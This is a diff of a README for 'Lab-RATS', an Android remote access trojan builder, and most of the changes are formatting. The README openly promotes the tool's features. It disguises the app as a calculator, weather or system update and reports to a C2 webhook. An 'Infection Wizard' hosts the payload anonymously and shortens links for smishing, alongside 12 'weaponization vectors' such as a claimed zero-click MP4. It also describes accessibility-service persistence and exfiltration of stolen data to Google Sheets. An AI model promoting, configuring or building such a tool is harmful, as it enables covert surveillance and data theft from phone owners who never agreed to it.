@@ -33,19 +33,20 @@
  │                         DEVELOPED BY K4N3CO                           │
  │                               © 2026                                  │
  └───────────────────────────────────────────────────────────────────────┘
-```
+  ```
+
+
+<img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white"> <img src="https://img.shields.io/badge/Gradle-8.10.2-C0181?style=for-the-badge&logo=gradle&logoColor=white">
+<img src="https://img.shields.io/badge/Android-SDK_34-white?style=for-the-badge&logo=android&logoColor=white"> <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
+<img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=airplayvideo&logoColor=white"> <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
+<img src="https://img.shields.io/badge/Network-Direct_IPv6-darkred?style=for-the-badge&logo=p2p&logoColor=white"> <img src="https://img.shields.io/badge/Mode-Stealth_FUD-orange?style=for-the-badge&logo=ghost&logoColor=white">
 
 # 🔥 Lab-RATS APK Builder
 
-<p align="center">
-  <a href="https://github.com/K4N3CO"><img src="https://img.shields.io/badge/K4N3CO-LAB_RATS-red?style=for-the-badge" alt="K4N3CO"></a>
-</p>
-
----
-
 ## 👨‍💻 Developer
 
-**K4N3CO**
+<b><img src="https://img.shields.io/badge/Developed By-K4N3CO.LABS ©2026-darkred?style=for-the-badge&logo=maserati&logoColor=white">
+</b><br>
 
 - 🔗 GitHub: [github.com/K4N3CO](https://github.com/K4N3CO)
 
@@ -97,13 +98,13 @@ https://github.com/user-attachments/assets/891459a2-4769-4dd3-8679-f586eca81efc
 
 ## 📋 Requirements
 
-### Required
+### Required:
 
 | Tool         | Version      | How to Get                           |
 | ------------ | ------------ | ------------------------------------ |
 | **Java JDK** | 17 or 21     | Builder auto-installs or shows guide |
 
-### Optional (for standalone vector generation)
+### Optional: (for standalone vector generation)
 
 | Tool            | Platform | Install                        |
 | --------------- | -------- | ------------------------------ |
@@ -117,7 +118,7 @@ https://github.com/user-attachments/assets/891459a2-4769-4dd3-8679-f586eca81efc
 ### 1. Start Build (Configure & Build)
 Complete guided setup:
 - **Keystore**: Unique signing certificate generation.
-- **Identity**: Select initial masquerade (Update, Calc, Weather, Settings, or Logo).
+- **Identity**: Select initial masquerade *(Update, Calc, Weather, Settings, or Logo)*.
 - **Branding**: Set App Name (e.g., "System Stability Service").
 - **ID**: Set Package Name (Application ID).
 - **C2**: Configure Webhook URL for data reporting.
@@ -135,9 +136,9 @@ Verifies your environment's Java/JDK setup and provides installation guides if t
 Generate standalone tactical vectors without building the main APK. Includes 12 specialized exploit delivery methods for multi-stage infection chains.
 
 ### 6. Infection Wizard (The Power Tool)
-The ultimate automated deployment flow:
+**The ultimate automated deployment flow**:
 1. **Build**: Generates the hardened APK.
-2. **Host**: Select hosting strategy (Anonymous Catbox Cloud or Direct IPv6 Link).
+2. **Host**: Select hosting strategy *(Anonymous Catbox Cloud or Direct IPv6 Link)*.
 3. **Shorten**: Generates a clean `is.gd` delivery URL (if cloud hosted).
 4. **Weaponize**: Creates a delivery vehicle from a library of 12 tactical vectors.
 
@@ -145,7 +146,7 @@ The ultimate automated deployment flow:
 
 ## ☁️ Hosting Strategies
 
-The Infection Wizard automates payload delivery through two primary methods:
+**The Infection Wizard** automates payload delivery through two primary methods:
 
 - **Anonymous Cloud (Catbox.moe)**: Automatically uploads the APK to Catbox for anonymous, publicly accessible hosting. Ideal for smishing and document-based delivery.
 - **Direct IP (IPv6)**: Generates a direct download link using the device's current IPv6 address and the C2 port. Best for targeted, proximity-based attacks or private network execution.
@@ -220,7 +221,7 @@ The app icon and name transform immediately after installation on the target dev
 
 ## 💉 Weaponization Vectors
 
-The builder supports 12 tactical delivery methods across the Lab and Wizard:
+The builder **supports 12 tactical delivery methods** across the Lab and Wizard:
 
 1. **Zero-Click MP4**: Utilizes media parser heap overflows for background execution.
 2. **Stealth PDF**: Document-based URI trigger for auto-download/install.
@@ -239,7 +240,7 @@ The builder supports 12 tactical delivery methods across the Lab and Wizard:
 
 ## 🔐 Persistence Layers (v1.5.1)
 
-The "Hardened" build includes multi-layer persistence:
+The "Hardened" build includes **multi-layer persistence**:
 
 1. **Accessibility Watchdog**: Uses high-survival service status to reanimate the core if killed.
 2. **WakeLock Sync**: Maintains CPU activity during network reporting in deep sleep.
@@ -250,7 +251,7 @@ The "Hardened" build includes multi-layer persistence:
 
 ## 📊 Google Sheet Integration
 
-To exfiltrate data to Google Sheets, follow these setup steps:
+To **exfiltrate data to Google Sheets**, follow these setup steps:
 
 1. **Create Sheet**: Go to [sheets.google.com](https://sheets.google.com) and create a new blank sheet.
 2. **Add Script**: Go to `Extensions` -> `Apps Script` and paste the `webhook.gs` code (found in the main project folder).
@@ -261,14 +262,14 @@ To exfiltrate data to Google Sheets, follow these setup steps:
 
 ## 📂 Output
 
-Built payloads are saved to:
+Built **payloads are saved to**:
 ```
-apk-builder/output/
+/Lab-RATS-main/apk-builder/output/
 ```
 
 ### Naming Format:
 - `{AppName}-v{Version}-signed.apk`
-- `exploit.*` (The weaponized delivery vehicle)
+- `exploit.*` *(The weaponized delivery vehicle)*
 
 ---
 
@@ -298,10 +299,8 @@ apk-builder/output/
 ---
 
 <p align="center">
-  <b>The one's who MIND don't matter. The one's who MATTER don't mind.</b><br>
-  </i>
-</p>
-<p align="center">
-  <b>Created by K4N3CO ©2026</b><br>
-  <a href="https://github.com/K4N3CO">GitHub</a>
-</p>
+  <b><img src="https://img.shields.io/badge/Developed By-K4N3CO.LABS ©2026-darkred?style=for-the-badge&logo=maserati&logoColor=white">
+</b><br>
+
+<p align="center"> 
+<b><img src="https://img.shields.io/badge/The one's who MIND don't matter-The one's who MATTER don't mind-cyan?style=for-the-badge&logo=counterstrike&logoColor=white">
